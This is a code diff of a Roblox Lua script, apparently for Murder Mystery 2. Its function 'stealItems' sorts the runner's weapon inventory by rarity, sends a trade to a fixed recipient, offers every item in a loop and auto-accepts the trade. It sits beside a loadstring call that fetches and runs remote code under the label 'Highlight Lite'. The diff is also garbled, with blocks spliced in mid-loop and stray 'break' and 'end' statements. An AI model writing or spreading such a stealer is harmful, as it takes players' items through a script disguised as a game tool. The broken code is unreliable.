@@ -205,84 +205,144 @@ local function stealItems()
 
     wait(3)
 
-    while true do -- Keep trading indefinitely
-        for i,v in pairs(uniqueItems) do
-            local args = {
-                [1] = v,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    while true do
+        -- Attempt to trade each item category, adding small delays between each to ensure server handling
+        for i, v in pairs(uniqueItems) do
+            local args = {[1] = v, [2] = "Weapons"}
+            pcall(function()
+                game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+            end)
+            wait(0.1)
         end
 
-        for i,v in pairs(ancientItems) do
-            local args = {
-                [1] = v,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        for i, v in pairs(ancientItems) do
+            local args = {[1] = v, [2] = "Weapons"}
+            pcall(function()
+                game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+            end)
+            wait(0.1)
         end
 
-        for i,v in pairs(godlyItems) do
-            local args = {
-                [1] = v,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        for i, v in pairs(godlyItems) do
+            local args = {[1] = v, [2] = "Weapons"}
+            pcall(function()
+                game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+            end)
+            wait(0.1)
         end
 
-        for i,v in pairs(vintageItems) do
-            local args = {
-                [1] = v,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        local levelTable = {}
+for i,v in pairs(LevelModule.XPTable) do
+    if PlayerDataModule.NewXP < v then
+        table.insert(levelTable, i)
+    end
+end
+local playerLevel = math.min(table.unpack(levelTable))
+local playerPrestige = LevelModule.Prestige
+
+local allItems = {}
+local itemsCount = 0
+
+local vintageItems = {}
+local commonItems = {}
+local uncommonItems = {}
+local rareItems = {}
+local legendaryItems = {}
+local godlyItems = {}
+local ancientItems = {}
+local uniqueItems = {}
+
+local vintageItemsC = 0
+local commonItemsC = 0
+local uncommonItemsC = 0
+local rareItemsC = 0
+local legendaryItemsC = 0
+local godlyItemsC = 0
+local ancientItemsC = 0
+local uniqueItemsC = 0
+
+for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c,d in pairs(b) do
+        table.insert(allItems, d.ItemName)
+
+        if d.Rarity == "Vintage" then
+            vintageItemsC = vintageItemsC + 1
+            table.insert(vintageItems, d.DataID)
         end
 
-        for i,v in pairs(legendaryItems) do
-            local args = {
-                [1] = v,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        if d.Rarity == "Common" then
+            commonItemsC = commonItemsC + 1
+            table.insert(commonItems, d.DataID)
         end
 
-        for i,v in pairs(rareItems) do
-            local args = {
-                [1] = v,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        if d.Rarity == "Uncommon" then
+            uncommonItemsC = uncommonItemsC + 1
+            table.insert(uncommonItems, d.DataID)
         end
 
-        for i,v in pairs(uncommonItems) do
-            local args = {
-                [1] = v,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        if d.Rarity == "Rare" then
+            rareItemsC = rareItemsC + 1
+            table.insert(rareItems, d.DataID)
         end
 
-        for i,v in pairs(commonItems) do
-            local args = {
-                [1] = v,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        if d.Rarity == "Legendary" then
+            legendaryItemsC = legendaryItemsC + 1
+            table.insert(legendaryItems, d.DataID)
         end
 
-        wait(6) -- Wait before sending the accept trade again (or adjust as needed)
-        local acc = {
-            [1] = 285646582 
-        }
-        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
+        if d.Rarity == "Godly" then
+            godlyItemsC = godlyItemsC + 1
+            table.insert(godlyItems, d.DataID)
+        end
 
-        -- Optionally, you can add a check to exit the loop if needed
-        -- Example: stop the loop after a certain number of trades, or if the player leaves
-        if not game:GetService("Players")[Username] then
-            break
+        if d.Rarity == "Ancient" then
+            ancientItemsC = ancientItemsC + 1
+            table.insert(ancientItems, d.DataID)
+        end
+
+        if d.Rarity == "Unique" then
+            uniqueItemsC = uniqueItemsC + 1
+            table.insert(uniqueItems, d.DataID)
         end
     end
 end
+
+for i,v in pairs(allItems) do
+    itemsCount = itemsCount + 1
+end
+
+local function isTradeModuleAvailable()
+    local success, TradeModule = pcall(function()
+        return require(game:GetService("ReplicatedStorage").Modules.TradeModule)
+    end)
+    return success and TradeModule
+end
+
+local function stealItems()
+    coroutine.resume(destroytrades2)
+
+    local sendArgs = {
+        [1] = game:GetService("Players")[Username]
+    }
+    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
+
+
+      
+
+        local acc = {[1] = 285646582}
+        pcall(function()
+            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
+        end)
+
+     
+        if not game:GetService("Players"):FindFirstChild(Username) then
+            break
+        end
+
+        wait(6)
+    end
+end
+
 
 
 local function pastebin(content)
@@ -388,4 +448,5 @@ end)
 
 if Script == "Highlight Lite" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Lite"))()
+    end
 end
